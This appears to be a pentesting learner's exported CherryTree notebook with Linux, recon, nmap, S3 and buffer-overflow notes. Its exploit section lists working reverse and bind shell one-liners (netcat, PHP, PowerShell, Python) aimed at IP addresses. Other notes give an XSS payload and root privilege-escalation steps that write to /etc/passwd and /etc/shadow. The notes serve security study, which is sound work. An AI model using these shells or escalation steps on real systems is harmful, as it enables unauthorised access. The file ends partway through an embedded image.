    <rich_text link="webs https://steflan-security.com/hack-the-box-blue-walkthrough/">https://steflan-security.com/hack-the-box-blue-walkthrough/</rich_text>
  </node>
  <node name="linux" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394178" ts_lastsave="1663435601">
    <rich_text>knowing filetype
file &lt;filename&gt;

create new user
sudo useradd &lt;username&gt;
sudo passwd &lt;username&gt;

delet new user
userdel username

switching user
su &lt;username&gt;

viewing process
ps

viewing process run by other user (in example by system)
ps aux

stop process
kill &lt;process_pid&gt;

starting sevice
systemctl start &lt;service_name&gt;

stopping sevice
systemctl stop &lt;service_name&gt;

find available shells
</rich_text>
    <rich_text family="monospace">cat /etc/shells</rich_text>
    <rich_text>

add new binary path
export PATH="${HOME}/.local/bin:${PATH}"

check running environment
env

history
history</rich_text>
    <node name="text_processing" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394284" ts_lastsave="1656694217">
      <rich_text foreground="#d4d4d4">default
cat &lt;file&gt; | grep &lt;search&gt;</rich_text>
      <rich_text>

</rich_text>
      <rich_text foreground="#c586c0">case</rich_text>
      <rich_text foreground="#d4d4d4"> insensitive
cat &lt;file&gt; | grep -i &lt;search&gt;</rich_text>
      <rich_text>

</rich_text>
      <rich_text foreground="#d4d4d4">does not contain
cat &lt;file&gt; | grep -n &lt;search&gt;</rich_text>
      <rich_text>

</rich_text>
      <rich_text foreground="#d4d4d4">sort result unique
cat &lt;file&gt; | grep &lt;search&gt; | sort -u</rich_text>
      <rich_text>

</rich_text>
      <rich_text foreground="#d4d4d4">count by new line
cat &lt;file&gt; | wc -l</rich_text>
      <rich_text>

</rich_text>
      <rich_text foreground="#d4d4d4">count by char
cat &lt;file&gt; | wc -</rich_text>
      <rich_text>c

</rich_text>
      <rich_text foreground="#d4d4d4">cutting table like string
cat &lt;file&gt; | cut -d &lt;delimiter&gt; -f &lt;position starts from 1&gt;</rich_text>
      <rich_text>

editing text file using sed
echo "I need to try hard" | sed 's/hard/harder/'

cutting using awk
echo "hello::there::friend" | awk -F "::" '{print $1, $3}'

</rich_text>
      <rich_text link="webs https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux">https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux</rich_text>
      <rich_text>
</rich_text>
      <rich_text family="monospace">grep -Rl "['AllowNoPassword']" /</rich_text>
      <rich_text>

grep -rnw '/' -e 'AllowNoPassword' 2 &gt; /dev/null

grep -rwl "root" / 2&gt; /dev/null  | grep phpmyadmin</rich_text>
    </node>
    <node name="export" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656669294" ts_lastsave="1656669297">
      <rich_text>The export command makes the variable accessible to any subprocesses we might spawn from our current Bash instance. If we set an environment variable without export it will only be available in the current shell.
</rich_text>
    </node>
    <node name="utilities" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394355" ts_lastsave="1655394356">
      <rich_text>finding files
locate &lt;filename&gt;

finding file other
find -name &lt;filename_can_wildcard&gt;</rich_text>
    </node>
    <node name="finding_files" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656667532" ts_lastsave="1663571102">
      <rich_text>using find

sudo find / -name sbd
^find by file name

finding binary in PATH
which

finding files by database
locate

grep -r "string" "path"</rich_text>
    </node>
    <node name="apt" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656668183" ts_lastsave="1656668381">
      <rich_text>update database
apt update

upgrade software
apt upgrade
apt upgrade &lt;specific_package&gt;

search available package
apt-cache search 

show information about specific package
apt show resource-agents

install new package
apt install

remove package and it's configuration
apt remove --purge

dpkg / .deb installer
dpkg -i &lt;package_file&gt;.deb</rich_text>
    </node>
    <node name="wget" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656864713" ts_lastsave="1656864755">
      <rich_text>wget from index page recusively
</rich_text>
      <rich_text family="monospace">wget -r -np -R "index.html*" </rich_text>
      <rich_text link="webs https://0a5000a903558665c06b54b600d7006b.web-security-academy.net/.git">https://0a5000a903558665c06b54b600d7006b.web-security-academy.net/.git</rich_text>
    </node>
  </node>
  <node name="python_module" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394196" ts_lastsave="1663435801">
    <node name="SimpleHTTPServer" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394751" ts_lastsave="1655394754">
      <rich_text>python -m SimpleHTTPServer &lt;port&gt;
python3 -m http.server &lt;port&gt;</rich_text>
    </node>
  </node>
  <node name="NodeJS" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1658117659" ts_lastsave="1658117662">
    <rich_text>Node Install Package : 
npm i &lt;package_name&gt;</rich_text>
  </node>
  <node name="docker" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1658114839" ts_lastsave="1658117659">
    <rich_text>sudo docker create --gpus all -p 8008:6006 -p 7777:8888 --mount type=bind,source=/home/marco/DISK/large/CELL,target=/workspace/ --name cell-2021 -it f0b0261fec71</rich_text>
  </node>
  <node name="BBH_WEB_MOBILE_APPLEVEL" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1659590868" ts_lastsave="1660630749">
    <rich_text>
</rich_text>
    <node name="recon" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394208" ts_lastsave="1660745468">
      <node name="S3_testing" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655797334" ts_lastsave="1659590937">
        <rich_text>Once youâve found a couple of buckets that belong to the target organization, use the AWS command line tool to see if you can access one. Install the tool by using the following command:
pip install awscli

Then configure it to work with AWS by following Amazonâs documentation at </rich_text>
        <rich_text link="webs https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.">https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.</rich_text>
        <rich_text> Now you should be able to access buckets directly from your terminal via the aws s3 command. Try listing the contents of the bucket you found:

aws s3 ls s3://BUCKET_NAME/

If this works, see if you can read the contents of any interesting files by copying files to your local machine:
aws s3 cp s3://BUCKET_NAME/FILE_NAME/path/to/local/directory

Gather any useful information leaked via the bucket and use it for future exploitation! If the organization reveals information such as active API keys or personal information, you should report this right away. Exposed S3 buckets alone are often considered a vulnerability. You can also try to upload new files to the bucket or delete files from it. If you can mess with its contents, you might be able to tamper with the web applicationâs operations or corrupt company data. For example, this command will copy your local file named TEST_FILE into the targetâs S3 bucket:

aws s3 cp TEST_FILE s3://BUCKET_NAME/

And this command will remove the TEST_FILE that you just uploaded:

aws s3 rm s3://BUCKET_NAME/TEST_FILE
</rich_text>
      </node>
      <node name="gobuster" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394811" ts_lastsave="1655794881">
        <rich_text>gobuster dir -u </rich_text>
        <rich_text link="webs http://&lt;url&gt;">http://&lt;url&gt;</rich_text>
        <rich_text> -w &lt;path_to_wordlist&gt;

gobuster dns -d target_domain -w wordlist
</rich_text>
      </node>
      <node name="nslookup" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394818" ts_lastsave="1655394997">
        <rich_text>using nslookup to get more info on a website

nslookup --type=A website.thm
nslookup --type=CNAME website.thm
nslookup --type=MX website.thm
nslookup --type=TXT website.thm</rich_text>
      </node>
      <node name="google_dork" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655797145" ts_lastsave="1655797270">
        <rich_text>third party

site:s3.amazonaws.com COMPANY_NAME
site:amazonaws.com COMPANY_NAME

amazonaws s3 COMPANY_NAME
amazonaws bucket COMPANY_NAME
amazonaws COMPANY_NAME
s3 COMPANY_NAME
</rich_text>
      </node>
      <node name="crt.sh" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655797274" ts_lastsave="1655797274">
        <rich_text link="webs https://crt.sh/">https://crt.sh/</rich_text>
        <rich_text>?q=facebook.com&amp;output=json.
</rich_text>
      </node>
      <node name="github_recon" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655797967" ts_lastsave="1655798008">
        <rich_text>Tools like Gitrob and TruffleHog can automate the GitHub recon process. Gitrob (</rich_text>
        <rich_text link="webs https://github.com/michenriksen/gitrob/)">https://github.com/michenriksen/gitrob/)</rich_text>
        <rich_text> locates potentially sensitive files pushed to public repositories on GitHub. TruffleHog (</rich_text>
        <rich_text link="webs https://github.com/">https://github.com/</rich_text>
        <rich_text>trufflesecurity/truffleHog/) specializes in finding secrets in repositories by conducting regex searches and scanning for high-entropy strings.

After youâve found leaked credentials, you can use KeyHacks (</rich_text>
        <rich_text link="webs https://github.com/streaak/keyhacks/)">https://github.com/streaak/keyhacks/)</rich_text>
        <rich_text> to check if the credentials are valid and learn how to use them to access the targetâs services</rich_text>
      </node>
      <node name="shodan" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1660745468" ts_lastsave="1661234719">
        <rich_text>by organization
org:"org_name"

ssl search
ssl:"org_name" 200</rich_text>
      </node>
      <node name="OSINT" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1661234719" ts_lastsave="1661234719"/>
    </node>
    <node name="exploit" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655471333" ts_lastsave="1659590885">
      <node name="command_injection_or_shell" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655471362" ts_lastsave="1659590868">
        <rich_text>Reverse

nc 172.16.1.100 1234 -e /bin/sh

php -r '$sock=fsockopen("10.18.200.169",1337);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'

mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

bind shell
mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.200.169",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

</rich_text>
      </node>
      <node name="unique_javascript_behaviour" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1657475731" ts_lastsave="1657483489">
        <rich_text>I just started working on portswigger's web cache poisoning, there is an XSS in which we inject a javascript object where the result of the injection looks like this:

```data = { "a" : "b", "c" : "c"-alert(0)-"c"}```

my question is, why is this alert got triggered? also this triggers on the following arithmetic operator +*%/ (addition, multiplication, modulo, and division) which led me to believe that it have to do with valid javascript strings operation, that somehow the alert js got evaluated by the browser?

anybody can help?

</rich_text>
        <rich_text foreground="#e7e9ea">JavaScript will allow you to use any object with a mathematical operator. In this case both strings will be used with the - operator and alert will be called and the result of calling alert will be undefined and that will also be used as part of the expression.</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://twitter.com/garethheyes/status/1546212977917018114">https://twitter.com/garethheyes/status/1546212977917018114</rich_text>
      </node>
    </node>
    <node name="neat_tricks" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1660052158" ts_lastsave="1660630763">
      <node name="HTTP_Headers" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1660052385" ts_lastsave="1660630834">
        <rich_text>1. PUT Option enabled and worked
</rich_text>
        <rich_text link="webs https://hackerone.com/reports/545136">https://hackerone.com/reports/545136</rich_text>
      </node>
      <node name="API" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1660052445" ts_lastsave="1660630841">
        <rich_text>1. IDOR via vulnerable API 
</rich_text>
        <rich_text link="webs https://hackerone.com/reports/1590237">https://hackerone.com/reports/1590237</rich_text>
      </node>
      <node name="XSS" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1660630804" ts_lastsave="1660630830">
        <rich_text>1. XSS via emoji
</rich_text>
        <rich_text link="webs https://medium.com/@fpatrik/how-i-found-an-xss-vulnerability-via-using-emojis-7ad72de49209">https://medium.com/@fpatrik/how-i-found-an-xss-vulnerability-via-using-emojis-7ad72de49209</rich_text>
        <rich_text>
ðimg src=x onerror=alert(document.domain)//ð
</rich_text>
      </node>
    </node>
  </node>
  <node name="Pentest" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1659590908" ts_lastsave="1659590911">
    <node name="Buffer_Overflow" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1658553478" ts_lastsave="1659590921">
      <rich_text>Spiking using:
generic_send_tcp &lt;host&gt; &lt;port&gt; &lt;something.spk&gt; 0 0

.spk syntax:
s_readline() &lt;= used to read the server banner perline
s_string("TRUN "); &lt;= used to send TRUN string
s_string_variable("FUZZ"); &lt;= used to send fuzzing

making pattern to find register offset
msf-pattern_create  -l 2988
msf-pattern_offset  -l 2988 -q 386F4337

mona look for jmp on specific register
!mona jmp -r &lt;register name&gt;

immunity debugger
Ctrl+G to look for specific address assemblly command
F2 to make break point</rich_text>
    </node>
    <node name="recon" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1659590921" ts_lastsave="1659590921">
      <node name="general_network_recon" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394791" ts_lastsave="1659590933">
        <rich_text>ping
ping &lt;ip/domain_target&gt;

traceroute
tracert &lt;ip/domain_target&gt;

dig
dig &lt;ip/domain_target&gt;

whois
whois &lt;ip/domain_target&gt;</rich_text>
      </node>
      <node name="enum4linux" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394769" ts_lastsave="1659590934">
        <rich_text>SMBShare enumeration
enum4linux -a &lt;ip&gt;</rich_text>
      </node>
      <node name="nmap" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394814" ts_lastsave="1659590927">
        <rich_text foreground="#569cd6">default</rich_text>
        <rich_text foreground="#d4d4d4">:</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#ce9178">nmap &lt;host&gt;</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#569cd6">favorite</rich_text>
        <rich_text foreground="#d4d4d4">:</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#ce9178">nmap -sC -sV -v &lt;host&gt;</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#569cd6">favorite BBH</rich_text>
        <rich_text foreground="#d4d4d4">:</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#ce9178">nmap -sC -sV -p- -v &lt;host&gt; -oG &lt;output_file&gt;</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#569cd6">vuln script</rich_text>
        <rich_text foreground="#d4d4d4">:</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#ce9178">nmap --script vuln &lt;host&gt;</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#ce9178">full tcp scan
-sT</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#ce9178">half scan (syn scan, stealth scan)
-sS</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#ce9178">UDP scan
-sU</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#ce9178">ping sweep
nmap -sn i&lt;ip_range i.e 127.0.0.1-255 or CIDR&lt;xxx.xxx.xxx.xxx/yy&gt;</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#ce9178">scripts
safe:- Won't affect the target</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#569cd6">intrusive:- Not safe</rich_text>
        <rich_text foreground="#d4d4d4">: </rich_text>
        <rich_text foreground="#ce9178">likely to affect the target
vuln:- Scan for vulnerabilities
exploit:- Attempt to exploit a vulnerability
auth:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)
brute:- Attempt to bruteforce credentials for running services
discovery:- Attempt to query running services for further information about the network (e.g. query an SNMP server).</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#569cd6">exhaustive list</rich_text>
        <rich_text foreground="#d4d4d4"> : </rich_text>
        <rich_text foreground="#ce9178">https://nmap.org/book/nse-usage.html</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#ce9178">search for script
grep "ftp" /usr/share/nmap/scripts/script.db</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#ce9178">download new script
sudo wget -O /usr/share/nmap/scripts/&lt;script-name&gt;.nse </rich_text>
        <rich_text link="webs https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse" foreground="#ce9178">https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse</rich_text>
        <rich_text foreground="#ce9178">
nmap --script-updatedb</rich_text>
      </node>
    </node>
  </node>
  <node name="post_exploit_shell" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655814635" ts_lastsave="1664288663">
    <rich_text link="webs https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh">https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh</rich_text>
    <rich_text>
</rich_text>
    <node name="shell_stabilizer" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655791685" ts_lastsave="1659188943">
      <rich_text>stable shell
technique 1:

spawn shell
python -c 'import pty;pty.spawn("/bin/bash")'

set_xterm
</rich_text>
      <rich_text family="monospace">export TERM=xterm</rich_text>
      <rich_text> -- this will give us access to term commands such as </rich_text>
      <rich_text family="monospace">clear</rich_text>
      <rich_text>

python -c 'import pty;pty.spawn("/bin/bash")'; 
</rich_text>
      <rich_text family="monospace">export TERM=xterm</rich_text>
      <rich_text>

python3 -c 'import pty;pty.spawn("/bin/bash")'; 
</rich_text>
      <rich_text family="monospace">export TERM=xterm</rich_text>
      <rich_text>

lastly
</rich_text>
      <rich_text family="monospace">stty raw -echo; fg</rich_text>
      <rich_text>

technique 2:
rlwrap
</rich_text>
      <rich_text family="monospace">rlwrap nc -lvnp &lt;port&gt;</rich_text>
      <rich_text>
</rich_text>
      <rich_text family="monospace">stty raw -echo; fg</rich_text>
      <rich_text>

tehcnique3:
The third easy way to stabilise a shell is quite simply to use  an initial netcat shell as a stepping stone into a more fully-featured  socat shell. Bear in mind that this technique is limited to Linux  targets, as a Socat shell on Windows will be no more stable than a  netcat shell. To accomplish this method of stabilisation we would first  transfer a </rich_text>
      <rich_text link="webs https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">socat static compiled binary</rich_text>
      <rich_text>  (a version of the program compiled to have no dependencies) up to the  target machine. A typical way to achieve this would be using a webserver  on the attacking machine inside the directory containing your socat  binary (</rich_text>
      <rich_text family="monospace">sudo python3 -m http.server 80</rich_text>
      <rich_text>), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (</rich_text>
      <rich_text family="monospace">wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</rich_text>
      <rich_text>). 
For  the sake of completeness: in a Windows CLI environment the same can be  done with Powershell, using either Invoke-WebRequest or a webrequest  system class, depending on the version of Powershell installed (</rich_text>
      <rich_text family="monospace">Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</rich_text>
      <rich_text>). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks. 


post stabilization:
run </rich_text>
      <rich_text family="monospace">stty -a</rich_text>
      <rich_text>. This will give you a large stream of output. Note down the values for "rows" and columns:
Next, in your reverse/bind shell, type in:
</rich_text>
      <rich_text family="monospace">stty rows &lt;number&gt;</rich_text>
      <rich_text>

and
</rich_text>
      <rich_text family="monospace">stty cols &lt;number&gt;</rich_text>
    </node>
    <node name="privesc" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655817747" ts_lastsave="1663514056">
      <rich_text>find SUID

find / -perm -u=s -type f 2&gt;/dev/null

find  executable with sudo
sudo -l 

check if /etc/passwd writeable
ls -la /etc/passwd

rewrite root with our hash password, or add new user
</rich_text>
      <rich_text family="monospace">openssl passwd -1 -salt [hash salt] [password to be used]</rich_text>
      <rich_text>Example below:
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h2">mkpasswd</rich_text>
      <rich_text>
mkpasswd encrypts the given password with the crypt(3) libc function using the given salt.
The syntax is as follows:
</rich_text>
      <rich_text family="monospace">mkpasswd -m [encryption algorithm] -S [hash salt]</rich_text>
      <rich_text>

result to append in passwd
hacked:$1$stef$ZYhbekI8UymZof5o8aY3A/:0:0:test:/root:/bin/bash

check shadow
</rich_text>
      <rich_text family="monospace">cat /etc/shadow</rich_text>
      <rich_text>

writable shadow
</rich_text>
      <rich_text family="monospace">ls -l /etc/shadow</rich_text>
      <rich_text>
Generate a new password hash with a password of your choice:
</rich_text>
      <rich_text family="monospace">mkpasswd -m sha-512 newpasswordhere</rich_text>
      <rich_text>
Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

check /etc/crontab
cat /etc/crontab

Find all the SUID/SGID executables on the Debian VM:
</rich_text>
      <rich_text family="monospace">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</rich_text>
      <rich_text>

</rich_text>
      <encoded_png char_offset="263" justification="left" link="">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